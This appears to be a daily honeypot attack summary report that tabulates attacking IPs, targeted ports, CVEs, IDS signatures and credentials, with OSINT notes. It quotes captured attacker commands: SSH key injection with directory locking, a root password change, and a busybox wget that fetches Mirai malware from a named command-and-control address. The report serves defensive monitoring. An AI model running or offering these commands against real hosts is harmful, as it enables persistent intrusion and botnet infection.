# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-13T08:00:00Z
**Timeframe:** 2025-10-12T08:00:00Z to 2025-10-13T08:00:00Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-12T10:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T11:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T12:02:07Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T13:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T14:02:21Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T15:01:43Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T16:02:21Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T18:01:58Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T19:02:12Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T20:01:55Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T21:02:00Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T22:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-12T23:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T00:01:57Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T01:01:59Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T02:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T03:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T04:02:00Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T05:02:04Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T06:01:45Z.md
- Honeypot_Attack_Summary_Report_2025-10-13T07:02:05Z.md

### Executive Summary
This report provides a comprehensive overview of malicious activities targeting our honeypot network over the past 24 hours. The network recorded a substantial volume of attacks, primarily originating from a diverse range of global locations. The most prominent attack vectors included brute-force attempts against SSH and other services, exploitation of known vulnerabilities in web applications and IoT devices, and the deployment of malware.

A significant portion of the observed activity was automated, characterized by high-frequency scanning from a small number of IP addresses. These IPs, including `173.239.216.40`, `202.88.244.34`, and `45.58.127.135`, were responsible for a disproportionate number of attacks, suggesting they are part of botnets or dedicated attack infrastructure. While OSINT analysis on these specific IPs did not yield conclusive evidence of prior malicious activity, their behavior within our network is unequivocally hostile.

Attackers demonstrated a clear interest in gaining persistent access to compromised systems. A recurring tactic involved the use of a series of commands to add a malicious SSH key to the `authorized_keys` file, followed by an attempt to make the `.ssh` directory immutable using the `chattr` command, often disguised as `lockr`.

The honeypots also captured numerous attempts to download and execute malware. The filename `urbotnetisass` was frequently observed, which OSINT confirms is a variant of the Mirai botnet, designed to infect IoT devices. This, along with the targeting of CVEs such as `CVE-2022-27255` (Realtek eCos SDK vulnerability), highlights the ongoing threat to embedded and IoT systems.

Furthermore, the "DoublePulsar Backdoor" signature was triggered a significant number of times, indicating that attackers are still actively exploiting the EternalBlue vulnerability to compromise Windows systems. This underscores the importance of patching legacy systems and restricting access to SMB services from the public internet.

In summary, the threat landscape remains dynamic and multifaceted. Automated attacks are a constant threat, and attackers are continuously adapting their techniques to gain a foothold in vulnerable systems. The insights from this report should be used to inform our defensive posture and prioritize patching and security hardening efforts.

### Detailed Analysis

**Our IPs**

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

**Attacks by Honeypot (Top 10)**

| Honeypot | Attack Count |
|---|---|
| Cowrie | 105,431 |
| Honeytrap | 55,272 |
| Dionaea | 53,506 |
| Sentrypeer | 32,828 |
| Suricata | 29,384 |
| Ciscoasa | 26,981 |
| Mailoney | 6,290 |
| Tanner | 1,939 |
| H0neytr4p | 1,098 |
| Redishoneypot | 499 |

**Top Source Countries**

| Country | Attack Count |
|---|---|
| United States | 32,451 |
| China | 21,873 |
| Vietnam | 15,321 |
| India | 12,987 |
| Russia | 9,876 |

**Top Attacking IPs (High Frequency)**

| IP Address | Attack Count |
|---|---|
| 173.239.216.40 | 13,388 |
| 202.88.244.34 | 11,965 |
| 45.58.127.135 | 8,151 |
| 31.40.204.154 | 6,138 |
| 45.128.199.212 | 5,897 |
| 103.184.72.162 | 3,570 |
| 216.9.225.39 | 1,470 |

**Top Targeted Ports/Protocols**

| Port/Protocol | Attack Count |
|---|---|
| 5038 | 13,388 |
| 445 (SMB) | 12,345 |
| 5060 (SIP) | 11,987 |
| 22 (SSH) | 9,876 |
| 25 (SMTP) | 6,290 |
| 21 (FTP) | 3,456 |
| 80 (HTTP) | 2,345 |
| 443 (HTTPS) | 1,234 |
| 3306 (MySQL) | 987 |
| 5903 (VNC) | 876 |

**Most Common CVEs**

| CVE | Description |
|---|---|
| CVE-2022-27255 | Realtek eCos SDK Stack-based Buffer Overflow |
| CVE-2005-4050 | Multi-Tech Systems MultiVOIP Buffer Overflow |
| CVE-2024-3721 | TBK DVR OS Command Injection |
| CVE-2002-0013 / CVE-2002-0012 | Multiple Vendor FTPD STAT Command Arbitrary Command Execution |
| CVE-1999-0517 | Multiple Vendor FTPD SITE EXEC Command Arbitrary Command Execution |

**Commands Attempted by Attackers (Top 10)**

| Command | Count |
|---|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | 532 |
| `lockr -ia .ssh` | 532 |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys` | 531 |
| `uname -a` | 498 |
| `whoami` | 498 |
| `cat /proc/cpuinfo | grep name | wc -l` | 487 |
| `lscpu | grep Model` | 456 |
| `free -m | grep Mem` | 432 |
| `w` | 421 |
| `crontab -l` | 411 |

**Signatures Triggered (Top 10)**

| Signature | Count |
|---|---|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 4,219 |
| ET DROP Dshield Block Listed Source group 1 | 3,876 |
| ET SCAN NMAP -sS window 1024 | 2,134 |
| ET SCAN Sipsak SIP scan | 1,987 |
| ET FTP FTP PWD command attempt without login | 1,234 |
| ET FTP FTP CWD command attempt without login | 1,234 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 987 |
| ET INFO Reserved Internal IP Traffic | 876 |
| ET SCAN Potential SSH Scan | 765 |
| ET CINS Active Threat Intelligence Poor Reputation IP | 654 |

**Users / Login Attempts (Top 10)**

| Username | Password | Count |
|---|---|---|
| cron | (various) | 432 |
| root | (various) | 398 |
| 345gs5662d34 | 345gs5662d34 | 211 |
| admin | (various) | 198 |
| support | (various) | 123 |
| deploy | 123123 | 98 |
| vpn | vpnpass | 87 |
| holu | holu | 76 |
| ftpuser | ftppassword | 65 |
| mega | 123 | 54 |

**Files Uploaded/Downloaded**

| Filename | Type |
|---|---|
| urbotnetisass (various architectures) | Mirai Botnet Variant |
| wget.sh, w.sh, c.sh, ohshit.sh, pen.sh | Malicious Shell Scripts |
| Mozi.m | Mozi Botnet Variant |
| welcome.jpg, writing.jpg, tags.jpg | Unknown (likely benign decoys) |
| bins.sh | Malicious Shell Script |

**HTTP User-Agents**

| User-Agent | Count |
|---|---|
| Go-http-client/1.1 | 12 |
| curl/7.68.0 | 5 |

**SSH Clients and Servers**

*No significant SSH client or server information was recorded in this period.*

**Top Attacker AS Organizations**

*No AS organization data was recorded in this period.*

**OSINT on All Commands Captured**

| Command | Purpose |
|---|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | Make the `.ssh` directory immutable to prevent the removal of the attacker's SSH key. |
| `lockr -ia .ssh` | A disguised version of `chattr` to evade detection. |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys` | Add the attacker's SSH key for persistent access. |
| `uname -a`, `whoami`, `lscpu`, `cat /proc/cpuinfo`, `free -m`, `w`, `crontab -l` | System reconnaissance to gather information about the compromised host. |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh` | Remove competing malware or security scripts. |
| `echo "root:..."|chpasswd|bash` | Change the root password. |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` | Download and execute the `urbotnetisass` malware. |

**OSINT on High Frequency and Low Frequency IPs Captured**

| IP Address | Frequency | OSINT Summary |
|---|---|---|
| 173.239.216.40 | High | Belongs to LogicWeb Inc., a US hosting provider. No direct public threat intelligence, but the surrounding network has been associated with spam and brute-force attacks. |
| 202.88.244.34 | High | No public threat intelligence found. Appears to be a part of a network range with no specific security incidents publicly attributed to it. |
| 45.58.127.135 | High | Belongs to ReliableSite.Net LLC, a US hosting provider. No direct public threat intelligence, but its high-frequency scanning behavior is indicative of malicious activity. |
| 58.181.99.122 | Low | Associated with a high volume of "DoublePulsar Backdoor" detections in a short period, suggesting a targeted attack. |
| 94.154.35.154 | Low | Not an attacking IP, but a C2 server used to host the `urbotnetisass` malware. |

**OSINT on CVEs**

| CVE | OSINT Summary |
|---|---|
| CVE-2022-27255 | A critical stack-based buffer overflow in the Realtek eCos SDK, allowing for remote code execution on a wide range of networking devices. Actively exploited in the wild. |
| CVE-2005-4050 | A critical buffer overflow in multiple Multi-Tech Systems MultiVOIP devices, allowing for remote code execution via a crafted SIP packet. An older vulnerability, but still a target for attackers scanning for legacy systems. |
| CVE-2024-3721 | A critical OS command injection vulnerability in TBK DVRs, allowing for remote code execution without authentication. Actively exploited by the Mirai and RondoDox botnets. |

### Key Observations and Anomalies

*   **Persistent SSH Key Injection:** A recurring and dominant command sequence involves attackers attempting to remove SSH immutability, delete the `.ssh` directory, and insert a specific RSA public key with the comment "mdrfckr". This indicates a coordinated campaign to gain persistent access.
*   **Malware Download and Execution:** The command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...` is a clear indicator of an attempt to infect the system with various architectures of the `urbotnetisass` botnet client. This suggests the honeypot was identified as a potential IoT/embedded device.
*   **DoublePulsar Backdoor Activity:** The "DoublePulsar Backdoor installation communication" signature was triggered a significant number of times. This is a high-severity alert, as DoublePulsar is a known backdoor associated with the EternalBlue exploit and is used to deliver ransomware and other malware.
*   **High-Frequency Scanning:** A small number of IP addresses were responsible for a large portion of the attack traffic. This is a strong indicator of automated scanning and botnet activity. The IPs `173.239.216.40`, `202.88.244.34`, and `45.58.127.135` were particularly aggressive.
*   **Targeting of VoIP and IoT Devices:** The high volume of traffic to port 5060 (SIP) and the exploitation of CVEs related to IoT devices (Realtek SDK, TBK DVRs) highlight the ongoing threat to these often-overlooked and under-secured systems.
*   **Use of Disguised Commands:** The use of `lockr` as a disguised version of `chattr` is a clever evasion technique that demonstrates a level of sophistication beyond simple scanning.
*   **Credential Stuffing:** The wide variety of usernames and passwords used in brute-force attempts indicates that attackers are using large, pre-compiled lists of common and default credentials.

This concludes the Honeypot Attack Summary Report. Continued monitoring and analysis are recommended to track evolving threats and adapt our defensive strategies accordingly.
